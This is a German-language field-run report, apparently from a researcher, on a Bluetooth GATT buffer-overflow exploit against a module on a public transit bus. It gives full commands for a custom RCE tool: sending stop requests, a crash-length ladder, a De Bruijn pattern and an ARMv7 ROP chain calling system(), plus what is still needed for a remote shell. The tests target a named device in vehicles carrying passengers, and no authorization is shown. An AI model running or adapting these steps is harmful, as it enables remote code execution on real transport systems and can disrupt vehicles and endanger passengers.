# Feldtest für den Action-Overflow an Linie 11

[English](../en/rce-field-run-2026-11-07.md) · [Deutsch](rce-field-run-2026-11-07.md)

Datum: 7. November 2026
Ziel: `78:C4:0E:C0:2B:D7`, Profil `p-8eef9540`, BlueZ 5.78
Status: Der Client kann die 512-Byte-Action jetzt zustellen. Echte Zieladressen sind weiterhin unbekannt.
Als Nächstes: [Phase-2-Plan](rce-phase-2-plan-2026-11-07.md).

## Kurzfassung

Meine früheren Action-Fehlschläge waren ein Client-Defekt, kein Urteil über das
Ziel. Die Android-App rief `writeCharacteristic` auf und verwarf den numerischen
Status. Die Ziel-Characteristic ist `PROPERTY_WRITE`, also sollten die Writes auf
den Bus gelangen. Der Bench verwendete außerdem gecachte Service-Objekte über
Verbindungsabbrüche hinweg weiter, was `ERROR_GATT_WRITE_REQUEST_BUSY` (201)
zurückgeben kann.

Der Client macht jetzt vier Dinge:

- er protokolliert den numerischen Status statt einer allgemeinen Ablehnung,
- er verbindet sich bei Status 201 einmal neu und leert den veralteten GATT-Cache,
- er handelt MTU 517 aus und kann einen 512-Byte-Write-Command senden,
- er hat einen Prepare-Write-Fallback für eine kleine MTU.

Im Labor habe ich den vollen Pfad gegen BlueZ 5.78 und einen 256-Byte-Handler
bewiesen: Ein Action-Write über die Luft überschreibt die gespeicherte
Rücksprungadresse und führt `system("echo PWNED-GATT")` aus. Das Labor sendet
einen 512-Byte-Write-Command bei MTU 517. Der Fallback sendet Prepare-Writes in
MTU-großen Blöcken und danach `Execute Write`.

Morgen ist mein erstes Ziel eine gemessene Antwort auf drei Fragen:

1. Akzeptiert das Ziel überhaupt einen 1-Byte-Action-Write?
2. Akzeptiert es 512 Byte?
3. Bei welcher Wertlänge hört das Ziel auf zu advertisen?

Die erste abstürzende Länge ist der Offset zu den überschriebenen Kontrolldaten.
Diese Zahl braucht meine Chain. Rate keine Offsets vor der Leiter.

Die Characteristic hat die Property `0x08` (Write mit Antwort), aber BlueZ prüft
die Schreibberechtigung, nicht den ATT-Opcode. Ein Write-Command erreicht
denselben Handler. Nutze `--mtu 0`, um die MTU-Aushandlung zu überspringen, wenn
sie das Ziel stört.

## Was sich geändert hat

| Pfad | Änderung |
|---|---|
| `research/brunel/rce.py` | MTU-Aushandlung, Write-Command, Prepare-Fallback, Längenleiter, korrigierte ARM-Pointer, optionale globale Befehlsadresse |
| `research/brunel/transport.py` | ATT-Antwort-Mitschnitt am festen L2CAP-Kanal, Senden roher Commands, MTU-Anfrage |
| `research/brunel/cli.py` | `--write-mode`, `--mtu`, `--ladder`, `--hello`, `--no-leak`, `--command-addr`, `--align-ret` |
| `research/tests/test_rce.py` | Zustellungs-Framing, Leiter, ARM-Gadget-Varianten |
| `exploit/.../BenchEngine.kt` | numerischer Write-Status, Busy-Retry, Cache-Reset, Writes ohne Antwort, `action_long`, `action_ladder` |
| `lab/action_target.py` | Ende-zu-Ende-Bumble-GATT-Server mit verwundbarem C-Handler |
| `lab/harness/action_vuln.c` | 256-Byte-Handler, `pop rdi; ret`, globales Kommando |
| `lab/scripts/action-e2e.sh` | Nachweis für Command- und Prepare-Write über zwei virtuelle Controller |
| `lab/scripts/action-rop.sh` | Chain-Nachweise für x86-64 und ARMv7 unter qemu |

## Ablaufreihenfolge auf dem Bus

Nutze für den Kontrolllauf das Laptop mit dem ASUS-Adapter. Es liefert rohes ATT,
MTU-Kontrolle und das exakte Timing, das meine Chain braucht. Das Telefon
zeichnet auf und beobachtet.

```sh
cd /mnt/storage/t3/projects/brunel-research/research
sudo scripts/setup-radio.sh   # einmal nach dem Umstecken, oder als root ausführen
```

### 1. Nur Fingerprint

```sh
sudo .venv/bin/brunel rce --transport usb:0 --scan-seconds 25 --no-leak --dry-run
```

Bestätige die Adresse, den Namen `BlueZ 5.78` und das Profil `p-8eef9540`. Wenn
sich die Adresse geändert hat, nutze die neue.

### 2. Den Write-Pfad mit einem Byte beweisen

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --hello --write-mode command --scan-seconds 25 \
  --settle 1.5 --recovery 20
```

Die Stufe `hello` sendet Action `0x01`, eine Stop-Anforderung. Ein Fahrgast sieht
die Anforderung. Behandle das als Zustandsänderung.

Wenn `hello` fehlschlägt, stoppe und protokolliere den Status. Fahre nicht mit
dem Overflow fort.

### 3. Die Absturzlänge finden

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --ladder --write-mode prepare --scan-seconds 25 \
  --settle 1.5 --recovery 25 --out ladder.json
```

Die Leiter sendet `41` als Füllung bei 1, 4, 8 und so weiter bis 512. Sie stoppt
bei der ersten Länge, bei der das Ziel aufhört zu advertisen. Diese Länge ist der
Offset zum ersten überschriebenen Kontrollwort oder der Offset zu einem
Stack-Canary.

Wenn die Leiter 512 ohne Absturz erreicht, kopiert die App nicht in einen festen
Stack-Puffer oder sie begrenzt die Kopie. Dann ist der nächste Test der
512-Byte-De-Bruijn-Lauf und die `action_long`-Sonde auf App-Ebene.

### 4. 512-Byte-De-Bruijn

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --write-mode prepare --scan-seconds 25 \
  --settle 1.5 --recovery 25 --out pattern.json
```

Nutze `prepare`, wenn die MTU-Aushandlung 517 nicht erreicht. Nutze `command`,
wenn die Stufe `hello` bereits funktioniert hat und die ausgehandelte MTU 517 ist.

### 5. Eine Chain erst nach der Leiter versuchen

Setze den Offset auf die erste abstürzende Länge. Beginne mit einem harmlosen
Kommando.

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --profile armv7 --offset 260 --gadget-words 3 \
  --system 0x00000000 --gadget 0x00000000 --cmd 'echo pwn' --scan-seconds 25
```

Mit Nulladressen sendet der Builder trotzdem das De-Bruijn-Muster, ein Lauf mit
Nulladressen ist also der Absturztest.

## Was die Telefon-App tun muss

Wenn das Laptop nicht verfügbar ist, führe dieselbe Reihenfolge aus der App aus.
Nutze diese Sonden in dieser Reihenfolge:

| Reihenfolge | Sonde | Zweck |
|---:|---|---|
| 1 | `fingerprint` | Adresse und Version |
| 2 | `gatt_enum` | Service `0x1f1f`, Characteristic `0x1f20`, Property `0x08` bestätigen |
| 3 | `att_mtu` | 517 bestätigen |
| 4 | `action_known` | Ein-Byte-Writes, numerischer Status |
| 5 | `action_ladder` | erste abstürzende Länge |
| 6 | `action_long` | 512-Byte-De-Bruijn |

Die App muss diese Werte für jeden Write protokollieren:

- Rückgabecode von `writeCharacteristic` (Integer, kein Boolean),
- Properties und Handle der Characteristic,
- MTU zum Zeitpunkt des Writes,
- Verbindungszustand und `operationId`,
- die exakte Wertlänge und die ersten 32 Bytes in Hex,
- Zeit zwischen dem Write und der nächsten Advertisement,
- Service-Inventar vor und nach einem vermuteten Absturz.

Die App muss sich für jede Action-Sonde frisch verbinden. Eine gecachte
Service-Liste nach einem Verbindungsabbruch hat die 201-Fehler erzeugt.

## Entscheidungsbaum

```text
hello-Write schlägt fehl
  -> Status protokollieren, neu verbinden, einmal wiederholen
  -> schlägt weiter fehl: Berechtigung, Verschlüsselung oder Busy. Aufzeichnen und stoppen.

hello-Write gelingt, Leiter erreicht 512 ohne Absturz
  -> kein Stack-Overflow auf dem Action-Pfad. Den Statusverlauf aufzeichnen.
  -> Write-Requests und Write-Commands getrennt in der Matrix probieren.

Leiter stürzt bei Länge L ab
  -> L ist das erste überschriebene Wort oder der Canary.
  -> wenn sich die App erholt, De-Bruijn bei 512 senden und die Absturzlänge behalten.
  -> wenn sich die App nicht erholt, braucht das Modul vielleicht einen Neustart der Stromversorgung.

512-Byte-Write zugestellt, kein Absturz
  -> der Handler verwirft den Rest oder begrenzt die Kopie.
  -> den Prepare-Pfad mit Offsets probieren, dann die Matrix.
```

## Aufzuzeichnende Belege

- Die JSON-Ergebnisdatei aus jedem Lauf.
- Die Telefon-Aufzeichnung mit `advertisement`-, `gatt_read`- und `gatt_write`-Ereignissen.
- Die exakte Absturzlänge und die Erholungszeit.
- Das Service-Inventar nach der Erholung. Wenn `0x1f20` weg ist und `0x2020`
  weiter antwortet, ist die App gestorben und `bluetoothd` hat überlebt. Wenn alle
  Services weg sind, ist der Daemon oder der Controller abgestürzt.
- Ein HCI-Snoop-Log vom Telefon und, wenn möglich, `btmon` auf dem Laptop.
- Der advertisierte Name nach einem Absturz. Wenn er zu Leerzeichen wird, teilen
  sich der EIR-Pfad und der Action-Pfad einen Stack.

## Sicherheit

- `0x01` ist eine Stop-Anforderung. Sende sie einmal am Anfang, nicht in einer Schleife.
- Ein 512-Byte-Absturz trennt Bluetooth für dieses Fahrzeug, bis die App neu startet.
- Führe die Leiter nicht auf einem Bus aus, der gleich die Fahrgast-Haltestelle erreicht.
- Lass die Telefon-Aufzeichnung laufen, damit ein negatives Ergebnis trotzdem Daten liefert.

## Zusätzliche hilfreiche Belege

- Fotografiere Modulaufkleber, Modell, Seriennummer und jeden freiliegenden Port.
  Die OUI ist `78:C4:0E` (H&D Wireless), aber der Aufkleber kann Trägerplatine und
  CPU nennen.
- Zeichne den GATT-Datenbank-Hash und den Wert von Client Supported Features vor
  jedem Write auf. Sie identifizieren den BlueZ-Build und den Cache-Zustand.
- Wenn ein Modul jemals auf einem Bench verfügbar ist, dumpe zuerst
  `/proc/self/maps`, das Action-App-Binary und `libc`. Das beantwortet jede
  Adressfrage auf einmal.
- Halte nach Möglichkeit einen unberührten Kontrollbus und einen Testbus im
  selben Lauf bereit.

## Was für eine echte Shell noch fehlt

- Der Puffer-Offset. Die Leiter misst ihn.
- Ein Stack-Canary-Wert, wenn der Build `-fstack-protector` nutzt.
- Die libc-Basis, `system` und ein `pop {r0, ...}`-Gadget. In einem 32-Bit-ARM-Build
  brauchen diese einen Firmware-Dump, ein Speicherleck oder einen Brute-Force-Lauf
  über den libc-Seitenoffset.
- Der Prozessbenutzer. Ein Absturz in einer Vendor-App ist kein
  `bluetoothd`-Absturz und kein root. Prüfe, ob die Action-App unabhängig überlebt.

Behaupte keine Shell aus einem Absturz. Ein Absturz plus ein wiederhergestellter
Service ist ein erreichbarer Overflow. Zur RCE wird es, wenn die Chain landet und
das Kommando läuft.

## Labor-Reproduktion

Derselbe Codepfad läuft offline ohne Funkberechtigungen:

```sh
lab/scripts/action-e2e.sh
lab/scripts/action-rop.sh
```

`action-e2e.sh` startet zwei verbundene virtuelle Controller, führt das
Bumble-Ziel mit dem verwundbaren Handler aus, sendet die echte ATT-Anfrage aus
`brunel rce` und prüft die Zielausgabe auf `PWNED-GATT`. Es läuft mit
`--write-mode command` und mit `--write-mode prepare` durch.
